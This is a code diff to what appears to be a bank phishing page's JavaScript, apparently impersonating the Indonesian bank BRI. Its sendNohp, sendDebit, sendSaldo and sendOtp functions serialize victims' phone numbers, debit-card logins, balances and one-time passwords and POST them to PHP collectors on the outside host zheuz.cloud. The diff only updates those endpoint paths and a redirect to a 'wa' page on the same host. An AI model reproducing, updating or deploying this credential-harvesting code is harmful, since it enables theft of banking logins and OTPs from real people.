@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'https://zheuz.cloud/bri/ty4de1c/no.php',
+        url: 'https://zheuz.cloud/bri/v1-ty4de1c/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://zheuz.cloud/bri/ty4de1c/login.php',
+        url: 'https://zheuz.cloud/bri/v1-ty4de1c/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'https://zheuz.cloud/bri/ty4de1c/saldo.php',
+        url: 'https://zheuz.cloud/bri/v1-ty4de1c/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://zheuz.cloud/bri/ty4de1c/otp.php',
+        url: 'https://zheuz.cloud/bri/v1-ty4de1c/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
@@ -127,7 +127,7 @@ function get(){
  $("#process1").show();
  $('.load').fadeIn();   
 setTimeout(function(){  
-location.href='https://zheuz.cloud/wa/ty4de1c';
+location.href='https://zheuz.cloud/wa/v1-ty4de1c';
  $("#process1").hide();
  $('.load').fadeOut();
  }, 2000);    
